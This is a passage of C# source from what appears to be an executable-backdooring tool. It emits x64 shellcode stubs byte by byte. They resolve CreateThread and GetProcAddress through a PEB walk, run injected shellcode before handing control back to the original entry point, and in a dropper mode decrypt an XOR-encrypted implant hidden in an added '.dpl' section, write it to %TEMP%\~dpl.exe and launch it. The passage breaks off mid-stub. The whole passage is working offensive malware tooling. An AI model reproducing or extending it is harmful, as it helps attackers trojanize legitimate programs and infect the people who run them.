        buf.AddRange(new byte[] { 0x7C, 0x00 });                               // jl search_loop (patch later)
        int jmpSkip = buf.Count;
        buf.AddRange(new byte[] { 0xEB, 0x00 });                               // jmp skip_thread (patch later)

        // found: resolve CreateThread address from ordinals + functions tables
        int foundPos = buf.Count;
        buf.AddRange(new byte[] { 0x41, 0x8B, 0x44, 0x24, 0x24 });             // mov eax, [r12+0x24]    (AddressOfNameOrdinals RVA)
        buf.AddRange(new byte[] { 0x48, 0x01, 0xD8 });                         // add rax, rbx           (ordinals VA)
        buf.AddRange(new byte[] { 0x42, 0x0F, 0xB7, 0x04, 0x58 });             // movzx eax, word [rax+r11*2] (ordinal)
        buf.AddRange(new byte[] { 0x41, 0x8B, 0x54, 0x24, 0x1C });             // mov edx, [r12+0x1C]    (AddressOfFunctions RVA)
        buf.AddRange(new byte[] { 0x48, 0x01, 0xDA });                         // add rdx, rbx           (functions VA)
        buf.AddRange(new byte[] { 0x8B, 0x04, 0x82 });                         // mov eax, [rdx+rax*4]   (function RVA)
        buf.AddRange(new byte[] { 0x48, 0x01, 0xD8 });                         // add rax, rbx           (CreateThread VA!)

        // ═══ [CreateThread with proper x64 ABI stack alignment] ═════════
        // RBP is already saved in SaveRegs; use it to save/restore RSP.
        // AND RSP, -16 guarantees alignment regardless of entry RSP value.
        buf.AddRange(new byte[] { 0x4D, 0x31, 0xC9 });                         // xor r9, r9             (will be lpParameter = NULL; also used as zero)
        buf.AddRange(new byte[] { 0x48, 0x89, 0xE5 });                         // mov rbp, rsp           (save RSP before alignment)
        buf.AddRange(new byte[] { 0x48, 0x83, 0xE4, 0xF0 });                   // and rsp, -16           (force 16-byte alignment)
        buf.AddRange(new byte[] { 0x48, 0x83, 0xEC, 0x30 });                   // sub rsp, 0x30          (0x20 shadow + 0x10 for params 5&6)
        buf.AddRange(new byte[] { 0x4C, 0x89, 0x4C, 0x24, 0x28 });             // mov [rsp+0x28], r9     (lpThreadId = NULL)
        buf.AddRange(new byte[] { 0x4C, 0x89, 0x4C, 0x24, 0x20 });             // mov [rsp+0x20], r9     (dwCreationFlags = 0)
        int leaR8Pos = buf.Count;
        buf.AddRange(new byte[] { 0x4C, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00 }); // lea r8, [rip+??]      (lpStartAddress = shellcode, patch later)
        buf.AddRange(new byte[] { 0x48, 0x31, 0xD2 });                         // xor rdx, rdx           (dwStackSize = 0)
        buf.AddRange(new byte[] { 0x48, 0x31, 0xC9 });                         // xor rcx, rcx           (lpThreadAttributes = NULL)
        buf.AddRange(new byte[] { 0xFF, 0xD0 });                               // call rax               (CreateThread!)
        buf.AddRange(new byte[] { 0x48, 0x89, 0xEC });                         // mov rsp, rbp           (restore original RSP)

        // skip_thread: (fall through to restore + JMP OEP)
        int skipThreadPos = buf.Count;

        // ═══ [Restore registers] ════════════════════════════════════════
        buf.AddRange(X64RestoreRegs); // 28 bytes

        // ═══ [Extra bytes before terminator (e.g. function-backdoor trampoline)] ═══
        if (extraBeforeTerminator != null)
            buf.AddRange(extraBeforeTerminator);

        // ═══ [JMP original entry point] or [RET for TLS carrier] ════════
        int jmpOepPos = buf.Count;
        if (tlsMode)
        {
            buf.Add(0xC3); // RET — return to TLS callback dispatcher; loader calls OEP separately
        }
        else
        {
            buf.Add(0xE9);
            buf.AddRange(new byte[4]); // placeholder — patched by PatchPayloadJmpOffset
        }

        // ═══ [Shellcode] ════════════════════════════════════════════════
        int shellcodePos = buf.Count;
        buf.AddRange(shellcode);

        // ─── Patch all relative jump offsets ────────────────────────────
        var bytes = buf.ToArray();

        // jne next_name (1st cmp failed)
        bytes[jneNext1 + 1] = (byte)(nextNamePos - (jneNext1 + 2));
        // jne next_name (2nd cmp failed)
        bytes[jneNext2 + 1] = (byte)(nextNamePos - (jneNext2 + 2));
        // jne next_name (3rd cmp failed)
        bytes[jneNext3 + 1] = (byte)(nextNamePos - (jneNext3 + 2));
        // jne next_name (name longer than CreateThread)
        bytes[jneNext4 + 1] = (byte)(nextNamePos - (jneNext4 + 2));
        // jmp found (both cmps passed)
        bytes[jmpFound + 1] = (byte)(foundPos - (jmpFound + 2));
        // jl search_loop (backward jump)
        bytes[jlSearch + 1] = unchecked((byte)(searchLoopPos - (jlSearch + 2)));
        // jmp skip_thread (CreateThread not found, skip call)
        bytes[jmpSkip + 1] = (byte)(skipThreadPos - (jmpSkip + 2));
        // lea r8, [rip + shellcode] — shellcode address for CreateThread
        int leaDisp = shellcodePos - (leaR8Pos + 7);
        BitConverter.GetBytes(leaDisp).CopyTo(bytes, leaR8Pos + 3);

        jmpOffsetInPayload = tlsMode ? -1 : jmpOepPos;
        return bytes;
    }
    //
    //  Layout: [prologue: cmdline space-scan] [normal_path: CreateThread stub]
    //          [EB → JMP_OEP] [silence_path: call shellcode + spin]
    //          [JMP_OEP: E9] [shellcode]
    //
    //  - No args  → normal_path runs; CreateThread(shellcode); host continues normally.
    //  - Any arg  → silence_path runs; shellcode called inline; host spins (suppressed).
    // ─────────────────────────────────────────────────────────────────────
    private byte[] BuildSilencePayload(byte[] shellcode, out int jmpOffsetInPayload)
    {
        var buf = new List<byte>();

        // ═══ [Prologue: scan PEB CommandLine for a space (= argument present)] ═
        // push rax, rcx, rdx, rsi
        buf.AddRange(new byte[] { 0x50, 0x51, 0x52, 0x56 });
        // xor rcx, rcx
        buf.AddRange(new byte[] { 0x48, 0x31, 0xC9 });
        // mov rax, gs:[rcx+0x60]  (PEB)
        buf.AddRange(new byte[] { 0x65, 0x48, 0x8B, 0x41, 0x60 });
        // mov rax, [rax+0x20]     (ProcessParameters)
        buf.AddRange(new byte[] { 0x48, 0x8B, 0x40, 0x20 });
        // movzx edx, word [rax+0x70]  (CommandLine.Length in bytes)
        buf.AddRange(new byte[] { 0x0F, 0xB7, 0x50, 0x70 });
        // shr edx, 1               (→ chars)
        buf.AddRange(new byte[] { 0xD1, 0xEA });
        // mov rsi, [rax+0x78]      (CommandLine.Buffer; rcx=0 = loop index)
        buf.AddRange(new byte[] { 0x48, 0x8B, 0x70, 0x78 });

        // check_loop:
        int checkLoopPos = buf.Count;
        // cmp ecx, edx
        buf.AddRange(new byte[] { 0x3B, 0xCA });
        int jgeNoArgPos = buf.Count;
        buf.AddRange(new byte[] { 0x7D, 0x00 });                               // jge no_arg (patch later)
        // movzx eax, word [rsi+rcx*2]  (SIB: scale=1 idx=RCX base=RSI → 0x4E)
        buf.AddRange(new byte[] { 0x0F, 0xB7, 0x04, 0x4E });
        // cmp ax, 0x20
        buf.AddRange(new byte[] { 0x66, 0x83, 0xF8, 0x20 });
        int jeFoundArgPos = buf.Count;
        buf.AddRange(new byte[] { 0x74, 0x00 });                               // je found_arg (patch later)
        // inc ecx
        buf.AddRange(new byte[] { 0xFF, 0xC1 });
        int jmpCheckLoopPos = buf.Count;
        buf.AddRange(new byte[] { 0xEB, 0x00 });                               // jmp check_loop (patch later)

        // found_arg: (space found → silence path)
        int foundArgPos = buf.Count;
        // pop rsi, rdx, rcx, rax
        buf.AddRange(new byte[] { 0x5E, 0x5A, 0x59, 0x58 });
        int jmpToSilencePos = buf.Count;
        buf.Add(0xE9);
        buf.AddRange(new byte[4]);                                              // jmp silence_path (near, patch later)

        // no_arg: (no space → normal path)
        int noArgPos = buf.Count;
        // pop rsi, rdx, rcx, rax
        buf.AddRange(new byte[] { 0x5E, 0x5A, 0x59, 0x58 });
        // fall through to normal_path

        // ═══ [normal_path: CreateThread stub — verbatim copy of BuildThreadedPayload] ═
        buf.AddRange(X64SaveRegs);
        buf.AddRange(X64Kernel32PebWalk);

        // Export directory parse
        buf.AddRange(new byte[] { 0x8B, 0x43, 0x3C });
        buf.AddRange(new byte[] { 0x48, 0x01, 0xD8 });
        buf.AddRange(new byte[] { 0x44, 0x8B, 0xA0, 0x88, 0x00, 0x00, 0x00 });
        buf.AddRange(new byte[] { 0x49, 0x01, 0xDC });

        // Search setup
        buf.AddRange(new byte[] { 0x41, 0x8B, 0x4C, 0x24, 0x18 });
        buf.AddRange(new byte[] { 0x45, 0x8B, 0x54, 0x24, 0x20 });
        buf.AddRange(new byte[] { 0x49, 0x01, 0xDA });
        buf.AddRange(new byte[] { 0x45, 0x31, 0xDB });

        int ctSearchLoopPos = buf.Count;
        buf.AddRange(new byte[] { 0x43, 0x8B, 0x34, 0x9A });
        buf.AddRange(new byte[] { 0x48, 0x01, 0xDE });
        buf.AddRange(new byte[] { 0x81, 0x3E, 0x43, 0x72, 0x65, 0x61 });       // "Crea"
        int ctJneNext1 = buf.Count; buf.AddRange(new byte[] { 0x75, 0x00 });
        buf.AddRange(new byte[] { 0x81, 0x7E, 0x04, 0x74, 0x65, 0x54, 0x68 }); // "teTh"
        int ctJneNext2 = buf.Count; buf.AddRange(new byte[] { 0x75, 0x00 });
        buf.AddRange(new byte[] { 0x81, 0x7E, 0x08, 0x72, 0x65, 0x61, 0x64 }); // "read"
        int ctJneNext3 = buf.Count; buf.AddRange(new byte[] { 0x75, 0x00 });
        buf.AddRange(new byte[] { 0x80, 0x7E, 0x0C, 0x00 });
        int ctJneNext4 = buf.Count; buf.AddRange(new byte[] { 0x75, 0x00 });
        int ctJmpFound = buf.Count; buf.AddRange(new byte[] { 0xEB, 0x00 });

        int ctNextNamePos = buf.Count;
        buf.AddRange(new byte[] { 0x41, 0xFF, 0xC3 });
        buf.AddRange(new byte[] { 0x41, 0x39, 0xCB });
        int ctJlSearch = buf.Count; buf.AddRange(new byte[] { 0x7C, 0x00 });
        int ctJmpSkip  = buf.Count; buf.AddRange(new byte[] { 0xEB, 0x00 });

        int ctFoundPos = buf.Count;
        buf.AddRange(new byte[] { 0x41, 0x8B, 0x44, 0x24, 0x24 });
        buf.AddRange(new byte[] { 0x48, 0x01, 0xD8 });
        buf.AddRange(new byte[] { 0x42, 0x0F, 0xB7, 0x04, 0x58 });
        buf.AddRange(new byte[] { 0x41, 0x8B, 0x54, 0x24, 0x1C });
        buf.AddRange(new byte[] { 0x48, 0x01, 0xDA });
        buf.AddRange(new byte[] { 0x8B, 0x04, 0x82 });
        buf.AddRange(new byte[] { 0x48, 0x01, 0xD8 });

        // CreateThread call with ABI alignment
        buf.AddRange(new byte[] { 0x4D, 0x31, 0xC9 });
        buf.AddRange(new byte[] { 0x48, 0x89, 0xE5 });
        buf.AddRange(new byte[] { 0x48, 0x83, 0xE4, 0xF0 });
        buf.AddRange(new byte[] { 0x48, 0x83, 0xEC, 0x30 });
        buf.AddRange(new byte[] { 0x4C, 0x89, 0x4C, 0x24, 0x28 });
        buf.AddRange(new byte[] { 0x4C, 0x89, 0x4C, 0x24, 0x20 });
        int ctLeaR8Pos = buf.Count;
        buf.AddRange(new byte[] { 0x4C, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00 }); // lea r8, [rip+??]
        buf.AddRange(new byte[] { 0x48, 0x31, 0xD2 });
        buf.AddRange(new byte[] { 0x48, 0x31, 0xC9 });
        buf.AddRange(new byte[] { 0xFF, 0xD0 });
        buf.AddRange(new byte[] { 0x48, 0x89, 0xEC });

        int ctSkipPos = buf.Count;
        buf.AddRange(X64RestoreRegs);

        // Short jump past silence_path to JMP_OEP
        int jmpToOepShortPos = buf.Count;
        buf.AddRange(new byte[] { 0xEB, 0x00 });                               // patch later

        // ═══ [silence_path: call shellcode inline, then spin] ═══════════
        int silencePathPos = buf.Count;
        buf.AddRange(X64SaveRegs);
        // E8 [rel32] — CALL shellcode (relative to next instruction)
        // shellcode is at: silencePathPos + 28(SaveRegs) + 5(this E8) = silencePathPos + 33
        // But we'll compute the disp32 after fixing the shellcode position.
        int callScPos = buf.Count;
        buf.Add(0xE8);
        buf.AddRange(new byte[4]);                                              // patch later
        buf.AddRange(X64RestoreRegs);
        // EB FE — infinite spin (host process suppressed)
        buf.AddRange(new byte[] { 0xEB, 0xFE });

        // ═══ [JMP OEP placeholder] ═══════════════════════════════════════
        int jmpOepPos = buf.Count;
        buf.Add(0xE9);
        buf.AddRange(new byte[4]);

        // ═══ [Shellcode] ═════════════════════════════════════════════════
        int shellcodePos = buf.Count;
        buf.AddRange(shellcode);

        // ─── Patch all offsets ───────────────────────────────────────────
        var bytes = buf.ToArray();

        // Prologue jumps
        bytes[jgeNoArgPos  + 1] = (byte)(noArgPos    - (jgeNoArgPos  + 2));
        bytes[jeFoundArgPos + 1] = (byte)(foundArgPos - (jeFoundArgPos + 2));
        bytes[jmpCheckLoopPos + 1] = unchecked((byte)(checkLoopPos - (jmpCheckLoopPos + 2)));
        // near JMP to silence_path
        int silenceRel = silencePathPos - (jmpToSilencePos + 5);
        BitConverter.GetBytes(silenceRel).CopyTo(bytes, jmpToSilencePos + 1);
        // CreateThread inner jumps
        bytes[ctJneNext1 + 1] = (byte)(ctNextNamePos - (ctJneNext1 + 2));
        bytes[ctJneNext2 + 1] = (byte)(ctNextNamePos - (ctJneNext2 + 2));
        bytes[ctJneNext3 + 1] = (byte)(ctNextNamePos - (ctJneNext3 + 2));
        bytes[ctJneNext4 + 1] = (byte)(ctNextNamePos - (ctJneNext4 + 2));
        bytes[ctJmpFound  + 1] = (byte)(ctFoundPos   - (ctJmpFound  + 2));
        bytes[ctJlSearch  + 1] = unchecked((byte)(ctSearchLoopPos - (ctJlSearch + 2)));
        bytes[ctJmpSkip   + 1] = (byte)(ctSkipPos    - (ctJmpSkip  + 2));
        // lea r8, [rip + shellcode]
        int ctLeaDisp = shellcodePos - (ctLeaR8Pos + 7);
        BitConverter.GetBytes(ctLeaDisp).CopyTo(bytes, ctLeaR8Pos + 3);
        // Short jump from end of normal_path over silence_path to JMP_OEP
        bytes[jmpToOepShortPos + 1] = (byte)(jmpOepPos - (jmpToOepShortPos + 2));
        // CALL shellcode from silence_path
        int callScDisp = shellcodePos - (callScPos + 5);
        BitConverter.GetBytes(callScDisp).CopyTo(bytes, callScPos + 1);

        jmpOffsetInPayload = jmpOepPos;
        return bytes;
    }

    // ─────────────────────────────────────────────────────────────────────
    //  AppendDplSection — Dropper mode
    //
    //  Appends an XOR-encrypted implant EXE as a read/write (non-exec) section
    //  named ".dpl". The dropper stub will XOR-decrypt and CreateProcess it
    //  from %TEMP% at runtime.
    // ─────────────────────────────────────────────────────────────────────
    private (byte[] newData, uint dplRva, uint dplSize) AppendDplSection(
        byte[] peData, ParsedPe pe, byte[] encryptedImplant)
    {
        const uint SCN_MEM_READ  = 0x40000000;
        const uint SCN_MEM_WRITE = 0x80000000;
        const uint SCN_CNT_DATA  = 0x00000040;
        const uint dplChars = SCN_MEM_READ | SCN_MEM_WRITE | SCN_CNT_DATA;  // 0xC0000040

        // Verify there is room for one more section header.
        int lastHeaderOffset = (int)pe.SectionHeadersFileOffset + (pe.NumberOfSections - 1) * 40;
        int newHeaderOffset  = lastHeaderOffset + 40;
        if (newHeaderOffset + 40 > (int)pe.SizeOfHeaders)
            throw new InvalidOperationException("No room in PE header for an additional section (.dpl). Use a PE with larger header padding.");

        uint fileAlign = pe.FileAlignment;
        uint sectAlign = pe.SectionAlignment;

        // Compute new section layout following the last existing section.
        var lastSect = pe.Sections[pe.Sections.Count - 1];
        uint lastVa  = lastSect.VirtualAddress + Math.Max(lastSect.VirtualSize, lastSect.RawSize);
        uint newRva  = AlignUp(lastVa, sectAlign);
        uint rawSize = AlignUp((uint)encryptedImplant.Length, fileAlign);
        uint rawOffset = AlignUp(lastSect.RawAddress + lastSect.RawSize, fileAlign);

        // Extend file.
        var newData = new byte[rawOffset + rawSize];
        Buffer.BlockCopy(peData, 0, newData, 0, peData.Length);
        Buffer.BlockCopy(encryptedImplant, 0, newData, (int)rawOffset, encryptedImplant.Length);

        // Update NumberOfSections (+1).
        int numSecOffset = (int)pe.NumberOfSectionsFileOffset;
        BitConverter.GetBytes((ushort)(pe.NumberOfSections + 1)).CopyTo(newData, numSecOffset);

        // Update SizeOfImage.
        uint newSizeOfImage = AlignUp(newRva + (uint)encryptedImplant.Length, sectAlign);
        BitConverter.GetBytes(newSizeOfImage).CopyTo(newData, (int)pe.SizeOfImageFieldFileOffset);

        // Write 40-byte section header.
        // Name: ".dpl\0\0\0\0"
        newData[newHeaderOffset + 0] = 0x2E; // '.'
        newData[newHeaderOffset + 1] = 0x64; // 'd'
        newData[newHeaderOffset + 2] = 0x70; // 'p'
        newData[newHeaderOffset + 3] = 0x6C; // 'l'
        // bytes 4-7 already zero (BlockCopy from zeroed array)
        // VirtualSize
        BitConverter.GetBytes((uint)encryptedImplant.Length).CopyTo(newData, newHeaderOffset + 8);
        // VirtualAddress
        BitConverter.GetBytes(newRva).CopyTo(newData, newHeaderOffset + 12);
        // SizeOfRawData
        BitConverter.GetBytes(rawSize).CopyTo(newData, newHeaderOffset + 16);
        // PointerToRawData
        BitConverter.GetBytes(rawOffset).CopyTo(newData, newHeaderOffset + 20);
        // PointerToRelocations, PointerToLinenumbers, counts → already zero
        // Characteristics
        BitConverter.GetBytes(dplChars).CopyTo(newData, newHeaderOffset + 36);

        return (newData, newRva, (uint)encryptedImplant.Length);
    }

    // ─────────────────────────────────────────────────────────────────────
    //  BuildDropperPayload — Dropper mode (x64 only)
    //
    //  PIC x64 stub that:
    //    1. Finds kernel32 via PEB walk.
    //    2. Finds GetProcAddress by name scan.
    //    3. XOR-decrypts the .dpl section in-place (using runtime ImageBase from PEB).
    //    4. Resolves GetTempPathW / CreateFileW / WriteFile / CloseHandle / CreateProcessW.
    //    5. Writes the decrypted implant to %TEMP%\~dpl.exe and CreateProcess it.
    //    6. JMPs to the original OEP so the host continues running.
    // ─────────────────────────────────────────────────────────────────────
    private byte[] BuildDropperPayload(uint dplRva, uint dplSize, byte xorKey)
    {
        var buf = new List<byte>();

        // ── Frame slot constants (relative to frame_base = RSP after X64SaveRegs + sub 0x288) ──
        const int SLOT_GTP  = 0x00; // GetTempPathW   fn ptr
        const int SLOT_CFW  = 0x08; // CreateFileW    fn ptr
        const int SLOT_WF   = 0x10; // WriteFile      fn ptr
        const int SLOT_CH   = 0x18; // CloseHandle    fn ptr
        const int SLOT_CPW  = 0x20; // CreateProcessW fn ptr
        const int SLOT_HFILE = 0x28; // HANDLE hFile (output from CreateFileW)
        // 0x30 = BytesWritten DWORD (used as &bw for WriteFile)
        // 0x40..0x13F = path buffer (128 WCHARs)
        // 0x140..0x1A7 = STARTUPINFOW (104 bytes)
        // 0x1A8..0x1BF = PROCESS_INFORMATION (24 bytes)

        // ── [Save registers + allocate frame] ────────────────────────────
        buf.AddRange(X64SaveRegs);                                              // 28 bytes
        // sub rsp, 0x288
        buf.AddRange(new byte[] { 0x48, 0x81, 0xEC, 0x88, 0x02, 0x00, 0x00 }); // 7 bytes

        // ── [Get ImageBase from PEB → R14] ───────────────────────────────
        // xor rcx, rcx
        buf.AddRange(new byte[] { 0x48, 0x31, 0xC9 });
        // mov rax, gs:[rcx+0x60]  (PEB)
        buf.AddRange(new byte[] { 0x65, 0x48, 0x8B, 0x41, 0x60 });
        // mov r14, [rax+0x10]     (PEB.ImageBaseAddress)  — REX=4C W+R, ModRM=70 mod01 r14_lo=6 rax=0
        buf.AddRange(new byte[] { 0x4C, 0x8B, 0x70, 0x10 });

        // ── [PEB walk: kernel32 base → RBX] ─────────────────────────────
        buf.AddRange(X64Kernel32PebWalk);                                       // 26 bytes (clobbers rax/rsi)

        // ── [Export directory parse] ─────────────────────────────────────
        buf.AddRange(new byte[] { 0x8B, 0x43, 0x3C });                         // mov eax, [rbx+0x3C]
        buf.AddRange(new byte[] { 0x48, 0x01, 0xD8 });                         // add rax, rbx
        buf.AddRange(new byte[] { 0x44, 0x8B, 0xA0, 0x88, 0x00, 0x00, 0x00 }); // mov r12d, [rax+0x88]
        buf.AddRange(new byte[] { 0x49, 0x01, 0xDC });                         // add r12, rbx

        // ── [Search setup] ───────────────────────────────────────────────
        buf.AddRange(new byte[] { 0x41, 0x8B, 0x4C, 0x24, 0x18 });             // mov ecx, [r12+0x18] NumberOfNames
        buf.AddRange(new byte[] { 0x45, 0x8B, 0x54, 0x24, 0x20 });             // mov r10d, [r12+0x20] AddressOfNames RVA
        buf.AddRange(new byte[] { 0x49, 0x01, 0xDA });                         // add r10, rbx
        buf.AddRange(new byte[] { 0x45, 0x31, 0xDB });                         // xor r11d, r11d  (index=0)

        // ── [GPA search loop: find "GetProcAddress"] ─────────────────────
        int gpaLoopPos = buf.Count;
        buf.AddRange(new byte[] { 0x43, 0x8B, 0x34, 0x9A });                   // mov esi, [r10+r11*4]
        buf.AddRange(new byte[] { 0x48, 0x01, 0xDE });                         // add rsi, rbx
        // cmp dword [rsi], "GetP" (0x50746547)
        buf.AddRange(new byte[] { 0x81, 0x3E, 0x47, 0x65, 0x74, 0x50 });
        int gpa1 = buf.Count; buf.AddRange(new byte[] { 0x75, 0x00 });         // jne gpaNext
        // cmp dword [rsi+4], "rocA" (0x41636F72)
        buf.AddRange(new byte[] { 0x81, 0x7E, 0x04, 0x72, 0x6F, 0x63, 0x41 });
        int gpa2 = buf.Count; buf.AddRange(new byte[] { 0x75, 0x00 });         // jne gpaNext
        // cmp dword [rsi+8], "ddre" (0x65726464)
        buf.AddRange(new byte[] { 0x81, 0x7E, 0x08, 0x64, 0x64, 0x72, 0x65 });
        int gpa3 = buf.Count; buf.AddRange(new byte[] { 0x75, 0x00 });         // jne gpaNext
        // cmp byte [rsi+14], 0  (null terminator confirms "GetProcAddress\0")
        buf.AddRange(new byte[] { 0x80, 0x7E, 0x0E, 0x00 });
        int gpa4 = buf.Count; buf.AddRange(new byte[] { 0x75, 0x00 });         // jne gpaNext
        int gpaJmpFound = buf.Count; buf.AddRange(new byte[] { 0xEB, 0x00 });  // jmp gpaFound

        int gpaNextPos = buf.Count;
        buf.AddRange(new byte[] { 0x41, 0xFF, 0xC3 });                         // inc r11d
        buf.AddRange(new byte[] { 0x41, 0x39, 0xCB });                         // cmp r11d, ecx
        int gpaJl = buf.Count; buf.AddRange(new byte[] { 0x7C, 0x00 });        // jl gpaLoop
        int gpaJmpSkip = buf.Count; buf.AddRange(new byte[] { 0xEB, 0x00 });   // jmp gpaSkip (not found)

        int gpaFoundPos = buf.Count;
        buf.AddRange(new byte[] { 0x41, 0x8B, 0x44, 0x24, 0x24 });             // mov eax, [r12+0x24]  ordinals RVA
        buf.AddRange(new byte[] { 0x48, 0x01, 0xD8 });                         // add rax, rbx
        buf.AddRange(new byte[] { 0x42, 0x0F, 0xB7, 0x04, 0x58 });             // movzx eax, word [rax+r11*2]
        buf.AddRange(new byte[] { 0x41, 0x8B, 0x54, 0x24, 0x1C });             // mov edx, [r12+0x1C]  functions RVA
        buf.AddRange(new byte[] { 0x48, 0x01, 0xDA });                         // add rdx, rbx
        buf.AddRange(new byte[] { 0x8B, 0x04, 0x82 });                         // mov eax, [rdx+rax*4]
        buf.AddRange(new byte[] { 0x48, 0x01, 0xD8 });                         // add rax, rbx
        // mov r15, rax  (R15 = GetProcAddress VA)  REX=49 W+B, opcode 89, ModRM C7
        buf.AddRange(new byte[] { 0x49, 0x89, 0xC7 });

        // gpaSkip: (fall-through from gpaFoundPos, or jmp here if not found)
        int gpaSkipPos = buf.Count;

        // Patch GPA search jumps
        var tempBytes = buf.ToArray();
        tempBytes[gpa1 + 1] = (byte)(gpaNextPos - (gpa1 + 2));
        tempBytes[gpa2 + 1] = (byte)(gpaNextPos - (gpa2 + 2));
        tempBytes[gpa3 + 1] = (byte)(gpaNextPos - (gpa3 + 2));
        tempBytes[gpa4 + 1] = (byte)(gpaNextPos - (gpa4 + 2));
        tempBytes[gpaJmpFound + 1] = (byte)(gpaFoundPos - (gpaJmpFound + 2));
        tempBytes[gpaJl + 1] = unchecked((byte)(gpaLoopPos - (gpaJl + 2)));
        tempBytes[gpaJmpSkip + 1] = (byte)(gpaSkipPos - (gpaJmpSkip + 2));
        buf.Clear();
        buf.AddRange(tempBytes);

        // ── [Set R13 = runtime VA of .dpl section] ───────────────────────
        // mov r13, r14   (R13 = ImageBase)  REX=4D W+R+B, 89, ModRM F5
        buf.AddRange(new byte[] { 0x4D, 0x89, 0xF5 });
        // add r13, dplRva  (48-bit add; REX=49 W+B, 81 /0, ModRM C5 mod11 /0 R13_lo=5)
        buf.AddRange(new byte[] { 0x49, 0x81, 0xC5 });
        buf.AddRange(BitConverter.GetBytes(dplRva));

        // ── [XOR decrypt .dpl in-place] ──────────────────────────────────
        // xor rcx, rcx  (loop index)
        buf.AddRange(new byte[] { 0x48, 0x31, 0xC9 });
        int xorLoopPos = buf.Count;
        // xor byte [r13 + rcx*1 + 0], xorKey
        // REX.B=1 for R13, opcode 80 /6 (XOR), ModRM=74 mod01 /6 SIB=4, SIB=0D scale0 RCX idx R13_lo base, disp8=0
        buf.AddRange(new byte[] { 0x41, 0x80, 0x74, 0x0D, 0x00, xorKey });
        // inc rcx
        buf.AddRange(new byte[] { 0x48, 0xFF, 0xC1 });
        // cmp ecx, dplSize
        buf.AddRange(new byte[] { 0x81, 0xF9 });
        buf.AddRange(BitConverter.GetBytes(dplSize));
        int xorJlPos = buf.Count;
        buf.AddRange(new byte[] { 0x7C, 0x00 });                               // jl xorLoop (patch later)

        // ── [Resolve 5 Win32 APIs via GetProcAddress] ────────────────────
        // Helper: EmitResolveApi — emits: mov rcx, rbx; E8 [len] [name\0]; pop rdx; call r15; mov [rsp+slot], rax
        void ResolveApi(string name, int slot)
        {
            byte[] nameBytes = System.Text.Encoding.ASCII.GetBytes(name + "\0");
            // mov rcx, rbx  (arg1 = kernel32 module handle)
            buf.AddRange(new byte[] { 0x48, 0x89, 0xD9 });
            // E8 [disp32=len(nameBytes)] [nameBytes]  (CALL/POP trick — pushes &name onto stack)
            buf.Add(0xE8);
            buf.AddRange(BitConverter.GetBytes(nameBytes.Length));
            buf.AddRange(nameBytes);
            // pop rdx  (arg2 = &name string)
            buf.Add(0x5A);
            // call r15  (GetProcAddress; REX.B=1 FF /2 ModRM D7)
            buf.AddRange(new byte[] { 0x41, 0xFF, 0xD7 });
            // mov [rsp+slot], rax  (store fn ptr)
            if (slot < 128)
                buf.AddRange(new byte[] { 0x48, 0x89, 0x44, 0x24, (byte)slot });
            else
            {
                buf.AddRange(new byte[] { 0x48, 0x89, 0x84, 0x24 });
                buf.AddRange(BitConverter.GetBytes(slot));
            }
        }

        ResolveApi("GetTempPathW",   SLOT_GTP);
        ResolveApi("CreateFileW",    SLOT_CFW);
        ResolveApi("WriteFile",      SLOT_WF);
        ResolveApi("CloseHandle",    SLOT_CH);
        ResolveApi("CreateProcessW", SLOT_CPW);

        // ── [GetTempPathW(128, &pathBuf)] ────────────────────────────────
        // Load fn ptr BEFORE sub rsp
        // mov rax, [rsp+SLOT_GTP]
        buf.AddRange(new byte[] { 0x48, 0x8B, 0x44, 0x24, SLOT_GTP });
        // sub rsp, 0x20  (shadow space for CALL)
        buf.AddRange(new byte[] { 0x48, 0x83, 0xEC, 0x20 });
        // mov ecx, 128  (nBufferLength)
        buf.AddRange(new byte[] { 0xB9, 0x80, 0x00, 0x00, 0x00 });
        // lea rdx, [rsp+0x60]  (lpBuffer; frame_base+0x40 = rsp+0x20+0x40 = rsp+0x60; 0x60<128 → disp8)
        buf.AddRange(new byte[] { 0x48, 0x8D, 0x54, 0x24, 0x60 });
        // call rax
        buf.AddRange(new byte[] { 0xFF, 0xD0 });
        // add rsp, 0x20
        buf.AddRange(new byte[] { 0x48, 0x83, 0xC4, 0x20 });
        // rax = char count (not null-terminated position in bytes)

        // ── [Append L"~dpl.exe\0" to path] ──────────────────────────────
        // shl rax, 1  (chars → bytes offset to null terminator)
        buf.AddRange(new byte[] { 0x48, 0xD1, 0xE0 });
        // lea rcx, [rsp+0x40]  (pathBuf base; 0x40=64 < 128 → disp8)
        buf.AddRange(new byte[] { 0x48, 0x8D, 0x4C, 0x24, 0x40 });
        // add rcx, rax  (rcx → existing null position)
        buf.AddRange(new byte[] { 0x48, 0x01, 0xC1 });
        // mov rax, L"~dpl"  (8 bytes: 7E 00 64 00 70 00 6C 00)
        buf.AddRange(new byte[] { 0x48, 0xB8, 0x7E, 0x00, 0x64, 0x00, 0x70, 0x00, 0x6C, 0x00 });
        // mov [rcx], rax
        buf.AddRange(new byte[] { 0x48, 0x89, 0x01 });
        // mov rax, L".exe"  (8 bytes: 2E 00 65 00 78 00 65 00)
        buf.AddRange(new byte[] { 0x48, 0xB8, 0x2E, 0x00, 0x65, 0x00, 0x78, 0x00, 0x65, 0x00 });
        // mov [rcx+8], rax
        buf.AddRange(new byte[] { 0x48, 0x89, 0x41, 0x08 });
        // mov word [rcx+16], 0  (null terminator)
        buf.AddRange(new byte[] { 0x66, 0xC7, 0x41, 0x10, 0x00, 0x00 });

        // ── [CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, NORMAL, NULL)] ──
        // mov rax, [rsp+SLOT_CFW]
        buf.AddRange(new byte[] { 0x48, 0x8B, 0x44, 0x24, SLOT_CFW });
        // sub rsp, 0x40  (shadow(0x20) + 3 stack args(0x18) + align(0x8))
        buf.AddRange(new byte[] { 0x48, 0x83, 0xEC, 0x40 });
        // arg7 hTemplate=NULL: xor rcx,rcx; mov [rsp+0x30],rcx
        buf.AddRange(new byte[] { 0x48, 0x31, 0xC9 });
        buf.AddRange(new byte[] { 0x48, 0x89, 0x4C, 0x24, 0x30 });
        // arg6 dwFlagsAndAttributes=0x80 (FILE_ATTRIBUTE_NORMAL): mov r8d, 0x80; mov [rsp+0x28],r8
        buf.AddRange(new byte[] { 0x41, 0xB8, 0x80, 0x00, 0x00, 0x00 });
        buf.AddRange(new byte[] { 0x4C, 0x89, 0x44, 0x24, 0x28 });
        // arg5 dwCreationDisposition=CREATE_ALWAYS=2: mov r8d, 2; mov [rsp+0x20],r8
